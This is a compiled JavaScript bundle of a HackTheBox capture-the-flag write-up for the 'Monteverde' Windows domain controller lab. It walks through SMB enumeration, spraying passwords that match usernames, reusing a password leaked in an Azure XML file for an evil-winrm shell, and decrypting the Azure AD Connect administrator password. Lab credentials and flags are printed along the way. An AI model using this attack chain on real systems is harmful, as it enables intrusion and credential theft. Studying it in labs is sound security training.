"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9254],{3905:(e,n,r)=>{r.d(n,{Zo:()=>u,kt:()=>g});var t=r(67294);function o(e,n,r){return n in e?Object.defineProperty(e,n,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[n]=r,e}function a(e,n){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),r.push.apply(r,t)}return r}function s(e){for(var n=1;n<arguments.length;n++){var r=null!=arguments[n]?arguments[n]:{};n%2?a(Object(r),!0).forEach((function(n){o(e,n,r[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):a(Object(r)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(r,n))}))}return e}function i(e,n){if(null==e)return{};var r,t,o=function(e,n){if(null==e)return{};var r,t,o={},a=Object.keys(e);for(t=0;t<a.length;t++)r=a[t],n.indexOf(r)>=0||(o[r]=e[r]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(t=0;t<a.length;t++)r=a[t],n.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(o[r]=e[r])}return o}var p=t.createContext({}),c=function(e){var n=t.useContext(p),r=n;return e&&(r="function"==typeof e?e(n):s(s({},n),e)),r},u=function(e){var n=c(e.components);return t.createElement(p.Provider,{value:n},e.children)},l="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},d=t.forwardRef((function(e,n){var r=e.components,o=e.mdxType,a=e.originalType,p=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),l=c(r),d=o,g=l["".concat(p,".").concat(d)]||l[d]||m[d]||a;return r?t.createElement(g,s(s({ref:n},u),{},{components:r})):t.createElement(g,s({ref:n},u))}));function g(e,n){var r=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=r.length,s=new Array(a);s[0]=d;var i={};for(var p in n)hasOwnProperty.call(n,p)&&(i[p]=n[p]);i.originalType=e,i[l]="string"==typeof e?e:o,s[1]=i;for(var c=2;c<a;c++)s[c]=r[c];return t.createElement.apply(null,s)}return t.createElement.apply(null,r)}d.displayName="MDXCreateElement"},31867:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>p,contentTitle:()=>s,default:()=>m,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var t=r(87462),o=(r(67294),r(3905));const a={layout:"post",title:"Monteverde ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","smb","pe","exploit","htb","azure"],date:"2020/06/11",thumbnail:"/img/HackTheBox/monteverde.png",toc:!0},s=void 0,i={unversionedId:"HackTheBox/Monteverde/write-up",id:"HackTheBox/Monteverde/write-up",title:"Monteverde ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/Monteverde/write-up.md",sourceDirName:"HackTheBox/Monteverde",slug:"/HackTheBox/Monteverde/write-up",permalink:"/writeups/HackTheBox/Monteverde/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"smb",permalink:"/writeups/tags/smb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"azure",permalink:"/writeups/tags/azure"}],version:"current",frontMatter:{layout:"post",title:"Monteverde ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","smb","pe","exploit","htb","azure"],date:"2020/06/11",thumbnail:"/img/HackTheBox/monteverde.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Mango ",permalink:"/writeups/HackTheBox/Mango/write-up"},next:{title:"Nest ",permalink:"/writeups/HackTheBox/Nest/write-up"}},p={},c=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network enumeration",id:"network-enumeration",level:3},{value:"Network reconnaissance",id:"network-reconnaissance",level:3},{value:"Privilege Escalation : mhope to Administrator",id:"privilege-escalation--mhope-to-administrator",level:3}],u={toc:c},l="wrapper";function m(e){let{components:n,...a}=e;return(0,o.kt)(l,(0,t.Z)({},u,a,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,o.kt)("h1",{id:""}),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Name:")," Monteverde"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Profile:")," ",(0,o.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/223"},"www.hackthebox.eu")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"monteverde",src:r(28149).Z,width:"598",height:"381"})),(0,o.kt)("h1",{id:"-1"}),(0,o.kt)("h3",{id:"overview"},"Overview"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Network enumeration"),": SMB enumeration"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Network reconnaissance"),": SMB share & Azure AD Connect config & credential stuffing"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Privilege Escalation : mhope to Administrator"),": hidden folder & Azure AD Connect credentials decryption")),(0,o.kt)("p",null,"Install tools used on BlackArch Linux:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap crackmapexec enum4linux impacket evil-winrm\n")),(0,o.kt)("h3",{id:"network-enumeration"},"Network enumeration"),(0,o.kt)("p",null,"I ran a ",(0,o.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," port scan to discover open ports:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo nmap -p- 10.10.10.172 -oA nmap_ports\n[sudo] password for cyfun:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 21:49 CET\nNmap scan report for 10.10.10.172\nHost is up (0.031s latency).\nNot shown: 65516 filtered ports\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49667/tcp open  unknown\n49673/tcp open  unknown\n49674/tcp open  unknown\n49675/tcp open  unknown\n49703/tcp open  unknown\n49775/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 123.83 seconds\n")),(0,o.kt)("p",null,"And then did a service discovery and script scan with ",(0,o.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," again on open\nports. "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'$ sudo nmap -sSVC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49703,49775 10.10.10.172 -oA nmap_services\n[sudo] password for cyfun:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 22:08 CET\nStats: 0:04:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nNSE Timing: About 99.34% done; ETC: 22:12 (0:00:01 remaining)\nNmap scan report for 10.10.10.172\nHost is up (0.031s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain?\n| fingerprint-strings:\n|   DNSVersionBindReqTCP:\n|     version\n|_    bind\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-25 20:20:31Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49675/tcp open  msrpc         Microsoft Windows RPC\n49703/tcp open  msrpc         Microsoft Windows RPC\n49775/tcp open  msrpc         Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-TCP:V=7.80%I=7%D=3/25%Time=5E7BC858%P=x86_64-unknown-linux-gnu%r\nSF:(DNSVersionBindReqTCP,20,"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07ver\nSF:sion\\x04bind\\0\\0\\x10\\0\\x03");\nService Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -48m05s\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2020-03-25T20:22:50\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 275.27 seconds\n')),(0,o.kt)("p",null,"Let's see what we can find through SMB with ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/byt3bl33d3r/CrackMapExec"},"CrackMapExec"),", ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/CiscoCXSecurity/enum4linux"},"enum4linux"),"\nand ",(0,o.kt)("inlineCode",{parentName:"p"},"GetNPUsers.py")," from impacket."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cme smb 10.10.10.172\nSMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)\n\n$ enum4linux -a 10.10.10.172\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Mar 25 22:30:29 2020\n\n ==========================\n|    Target Information    |\n ==========================\nTarget ........... 10.10.10.172\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n ====================================================\n|    Enumerating Workgroup/Domain on 10.10.10.172    |\n ====================================================\n[E] Can't find workgroup/domain\n\n\n ============================================\n|    Nbtstat Information for 10.10.10.172    |\n ============================================\nLooking up status of 10.10.10.172\nNo reply from 10.10.10.172\n\n =====================================\n|    Session Check on 10.10.10.172    |\n =====================================\n[+] Server 10.10.10.172 allows sessions using username '', password ''\n[+] Got domain/workgroup name:\n\n ===========================================\n|    Getting domain SID for 10.10.10.172    |\n ===========================================\nUnable to initialize messaging context\nDomain Name: MEGABANK\nDomain Sid: S-1-5-21-391775091-850290835-3566037492\n[+] Host is part of a domain (not a workgroup)\n\n ======================================\n|    OS information on 10.10.10.172    |\n ======================================\n[+] Got OS info for 10.10.10.172 from smbclient:\n[+] Got OS info for 10.10.10.172 from srvinfo:\nUnable to initialize messaging context\nCould not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED\n\n =============================\n|    Users on 10.10.10.172    |\n =============================\nindex: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.\nindex: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)\nindex: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain\nindex: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)\nindex: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)\nindex: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)\nindex: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)\nindex: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)\nindex: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)\nindex: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)\n\nuser:[Guest] rid:[0x1f5]\nuser:[AAD_987d7f2f57d2] rid:[0x450]\nuser:[mhope] rid:[0x641]\nuser:[SABatchJobs] rid:[0xa2a]\nuser:[svc-ata] rid:[0xa2b]\nuser:[svc-bexec] rid:[0xa2c]\nuser:[svc-netapp] rid:[0xa2d]\nuser:[dgalanos] rid:[0xa35]\nuser:[roleary] rid:[0xa36]\nuser:[smorgan] rid:[0xa37]\n\n =========================================\n|    Share Enumeration on 10.10.10.172    |\n =========================================\nUnable to initialize messaging context\ndo_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\nUnable to connect with SMB1 -- no workgroup available\n\n[+] Attempting to map shares on 10.10.10.172\n\n ====================================================\n|    Password Policy Information for 10.10.10.172    |\n ====================================================\n[E] Unexpected error from polenum:\n\n\n[+] Attaching to 10.10.10.172 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n        [!] Protocol failed: Cannot request session (Called Name:10.10.10.172)\n\n[+] Trying protocol 445/SMB...\n\n        [!] Protocol failed: Missing required parameter 'digestmod'.\n\n\n[+] Retieved partial password policy with rpcclient:\n\nPassword Complexity: Disabled\nMinimum Password Length: 7\n\n\n ==============================\n|    Groups on 10.10.10.172    |\n ==============================\n\n[+] Getting builtin groups:\ngroup:[Pre-Windows 2000 Compatible Access] rid:[0x22a]\ngroup:[Incoming Forest Trust Builders] rid:[0x22d]\ngroup:[Windows Authorization Access Group] rid:[0x230]\ngroup:[Terminal Server License Servers] rid:[0x231]\ngroup:[Users] rid:[0x221]\ngroup:[Guests] rid:[0x222]\ngroup:[Remote Desktop Users] rid:[0x22b]\ngroup:[Network Configuration Operators] rid:[0x22c]\ngroup:[Performance Monitor Users] rid:[0x22e]\ngroup:[Performance Log Users] rid:[0x22f]\ngroup:[Distributed COM Users] rid:[0x232]\ngroup:[IIS_IUSRS] rid:[0x238]\ngroup:[Cryptographic Operators] rid:[0x239]\ngroup:[Event Log Readers] rid:[0x23d]\ngroup:[Certificate Service DCOM Access] rid:[0x23e]\ngroup:[RDS Remote Access Servers] rid:[0x23f]\ngroup:[RDS Endpoint Servers] rid:[0x240]\ngroup:[RDS Management Servers] rid:[0x241]\ngroup:[Hyper-V Administrators] rid:[0x242]\ngroup:[Access Control Assistance Operators] rid:[0x243]\ngroup:[Remote Management Users] rid:[0x244]\ngroup:[Storage Replica Administrators] rid:[0x246]\n\n[+] Getting builtin group memberships:\nGroup 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs\nGroup 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs\nGroup 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs\nGroup 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs\nGroup 'Users' (RID: 545) has member: Couldn't lookup SIDs\nGroup 'Guests' (RID: 546) has member: Couldn't lookup SIDs\n\n[+] Getting local groups:\ngroup:[Cert Publishers] rid:[0x205]\ngroup:[RAS and IAS Servers] rid:[0x229]\ngroup:[Allowed RODC Password Replication Group] rid:[0x23b]\ngroup:[Denied RODC Password Replication Group] rid:[0x23c]\ngroup:[DnsAdmins] rid:[0x44d]\ngroup:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]\ngroup:[ADSyncAdmins] rid:[0x451]\ngroup:[ADSyncOperators] rid:[0x452]\ngroup:[ADSyncBrowse] rid:[0x453]\ngroup:[ADSyncPasswordSet] rid:[0x454]\n\n[+] Getting local group memberships:\nGroup 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs\nGroup 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs\n\n[+] Getting domain groups:\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[DnsUpdateProxy] rid:[0x44e]\ngroup:[Azure Admins] rid:[0xa29]\ngroup:[File Server Admins] rid:[0xa2e]\ngroup:[Call Recording Admins] rid:[0xa2f]\ngroup:[Reception] rid:[0xa30]\ngroup:[Operations] rid:[0xa31]\ngroup:[Trading] rid:[0xa32]\ngroup:[HelpDesk] rid:[0xa33]\ngroup:[Developers] rid:[0xa34]\n\n[+] Getting domain group memberships:\nGroup 'Operations' (RID: 2609) has member: MEGABANK\\smorgan\nGroup 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\\Administrator\nGroup 'Domain Guests' (RID: 514) has member: MEGABANK\\Guest\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\Administrator\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\krbtgt\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\AAD_987d7f2f57d2\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\mhope\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\SABatchJobs\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\svc-ata\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\svc-bexec\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\svc-netapp\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\dgalanos\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\roleary\nGroup 'Domain Users' (RID: 513) has member: MEGABANK\\smorgan\nGroup 'Trading' (RID: 2610) has member: MEGABANK\\dgalanos\nGroup 'Azure Admins' (RID: 2601) has member: MEGABANK\\Administrator\nGroup 'Azure Admins' (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2\nGroup 'Azure Admins' (RID: 2601) has member: MEGABANK\\mhope\nGroup 'HelpDesk' (RID: 2611) has member: MEGABANK\\roleary\n\n =======================================================================\n|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |\n =======================================================================\n[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.\n\n =============================================\n|    Getting printer info for 10.10.10.172    |\n =============================================\nUnable to initialize messaging context\nCould not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED\n\nenum4linux complete on Wed Mar 25 22:31:39 2020\n\n$ GetNPUsers.py -no-pass -dc-ip 10.10.10.172 MEGABANK/smorgan\n-> nothing\n")),(0,o.kt)("p",null,"Thanks to ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/CiscoCXSecurity/enum4linux"},"enum4linux"),", we now have all users and groups information we need."),(0,o.kt)("p",null,"Let's try a quick bruteforce where user = password with ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/byt3bl33d3r/CrackMapExec"},"CrackMapExec"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cme smb 10.10.10.172 -u users.txt -p users.txt\n...\nSMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\\SABatchJobs:SABatchJobs\n")),(0,o.kt)("h3",{id:"network-reconnaissance"},"Network reconnaissance"),(0,o.kt)("p",null,"We found the password ",(0,o.kt)("inlineCode",{parentName:"p"},"SABatchJobs")," use the username as password.\nLet's use this account for enumerating some shares:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares\nSMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)\nSMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\\SABatchJobs:SABatchJobs\nSMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated shares\nSMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark\nSMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------\nSMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin\nSMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ\nSMB         10.10.10.172    445    MONTEVERDE       C$                              Default share\nSMB         10.10.10.172    445    MONTEVERDE       E$                              Default share\nSMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC\nSMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share\nSMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share\nSMB         10.10.10.172    445    MONTEVERDE       users$          READ\n")),(0,o.kt)("p",null,"Let's find is there are valuable files in ",(0,o.kt)("inlineCode",{parentName:"p"},"users$")," share."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ smbclient '\\\\10.10.10.172\\users$' -U 'SABatchJobs'\nUnable to initialize messaging context\nEnter WORKGROUP\\SABatchJobs's password:\nTry \"help\" to get a list of possible commands.\nsmb: \\> recuse on\nrecuse: command not found\nsmb: \\> recurse on\nsmb: \\> prompt off\nsmb: \\> mget *\ngetting file \\mhope\\azure.xml of size 1212 as azure.xml (4,8 KiloBytes/sec) (average 4,8 KiloBytes/sec)\n")),(0,o.kt)("p",null,"Let's read ",(0,o.kt)("inlineCode",{parentName:"p"},"/mhope/azure.xml"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">\n  <Obj RefId="0">\n    <TN RefId="0">\n      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>\n      <T>System.Object</T>\n    </TN>\n    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>\n    <Props>\n      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>\n      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>\n      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>\n      <S N="Password">4n0therD4y@n0th3r$</S>\n    </Props>\n  </Obj>\n</Objs>\n')),(0,o.kt)("p",null,"It seems a password is leaked, let's try credential stuffing: maybe we can\nre-use one of the accounts."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cme smb 10.10.10.172 -u ../users.txt -p '4n0therD4y@n0th3r$'\nSMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)\nSMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE\nSMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\\mhope:4n0therD4y@n0th3r$\n")),(0,o.kt)("p",null,"Cool ",(0,o.kt)("inlineCode",{parentName:"p"},"mhope")," is using this password too."),(0,o.kt)("p",null,"As winRM port is open, we can authenticate and gain shell access with\n",(0,o.kt)("a",{parentName:"p",href:"https://github.com/Hackplayers/evil-winrm"},"evil-winrm"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'\n\nEvil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\mhope\\Documents> gc ../Desktop/user.txt\n4961976bd7d8f4eeb2ce3705e2f212f2\n")),(0,o.kt)("h3",{id:"privilege-escalation--mhope-to-administrator"},"Privilege Escalation : mhope to Administrator"),(0,o.kt)("p",null,"Then there is a hidden folder:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\mhope\\.Azure> dir -Force\n\n\n    Directory: C:\\Users\\mhope\\.Azure\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         1/3/2020   5:35 AM                ErrorRecords\n-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json\n-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json\n-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json\n-a----         1/3/2020   5:36 AM           7896 TokenCache.dat\n")),(0,o.kt)("p",null,"We have azure powershell already loaded ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/Azure/azure-powershell"},"https://github.com/Azure/azure-powershell")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\mhope\\.Azure> Get-AzContext\n\nName                                     Account                                              SubscriptionName                                    Environment                                         TenantId\n----                                     -------                                              ----------------                                    -----------                                         --------\n372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com                                                                 AzureCloud                                          372efea9-7bc4-4b76-8839-984b45edfb98\n")),(0,o.kt)("p",null,"There is great resources and tools about exploiting ",(0,o.kt)("em",{parentName:"p"},"Azure AD Connect"),"."),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/"},"Azure AD Connect Database Exploit (Priv Esc)")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/fox-it/adconnectdump"},"Azure AD Connect password extraction"))),(0,o.kt)("p",null,"You can fidn a pre-compiled version of ",(0,o.kt)("inlineCode",{parentName:"p"},"AdSyncDecrypt")," ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/VbScrub/AdSyncDecrypt/releases"},"here"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"C:/Users/mhope/.Azure/AdDecrypt.exe -FullSQL\n\n======================\nAZURE AD SYNC CREDENTIAL DECRYPTION TOOL\nBased on original code from: https://github.com/fox-it/adconnectdump\n======================\n\nOpening database connection...\nExecuting SQL commands...\nClosing database connection...\nDecrypting XML...\nParsing XML...\nFinished!\n\nDECRYPTED CREDENTIALS:\nUsername: administrator\nPassword: d0m@in4dminyeah!\nDomain: MEGABANK.LOCAL\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> gc ../Desktop/root.txt\n12909612d25c8dcf6e5a07d1a804a0bc\n")))}m.isMDXComponent=!0},28149:(e,n,r)=>{r.d(n,{Z:()=>t});const t=r.p+"assets/images/monteverde-1402b47aac6667510dd43c9ac267cba3.png"}}]);